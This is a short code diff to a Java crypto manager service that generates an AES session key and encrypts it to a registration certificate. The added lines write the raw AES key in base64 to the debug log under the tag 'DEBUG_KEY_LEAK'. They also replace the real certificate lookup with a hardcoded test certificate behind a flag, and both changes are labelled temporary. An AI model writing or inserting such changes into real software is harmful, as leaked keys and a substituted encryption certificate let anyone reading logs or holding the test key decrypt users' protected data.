@@ -100,6 +100,8 @@ public class CryptoManagerServiceImpl implements CryptoManagerService {
 
         KeyGenerator keyGen = generateAESKey(KEYGEN_SYMMETRIC_KEY_LENGTH);
         SecretKey secretKey = keyGen.generateKey();
+        // TEMPORARY DEBUG ONLY — remove before any real build
+        Log.d("DEBUG_KEY_LEAK", "AES key (base64): " + CryptoUtil.base64encoder.encodeToString(secretKey.getEncoded()));
         final byte[] encryptedData;
         byte[] headerBytes = new byte[0];
         if (isDataValid(nullOrTrim(cryptoRequestDto.getSalt()))) {
@@ -117,7 +119,10 @@ public class CryptoManagerServiceImpl implements CryptoManagerService {
             }
         }
 
-        String certificateData = certificateManagerService.getCertificate("REGISTRATION", cryptoRequestDto.getReferenceId());
+        // TEST ONLY — see CredIssuerTestConfig. Set ENABLED = false to restore keymanager lookup.
+        String certificateData = CredIssuerTestConfig.ENABLED
+                ? CredIssuerTestConfig.TEST_CERTIFICATE_PEM
+                : certificateManagerService.getCertificate("REGISTRATION", cryptoRequestDto.getReferenceId());
         Certificate certificate = convertToCertificate(certificateData);
         Log.i(TAG,"Found the cerificate, proceeding with session key encryption.");
         PublicKey publicKey = certificate.getPublicKey();
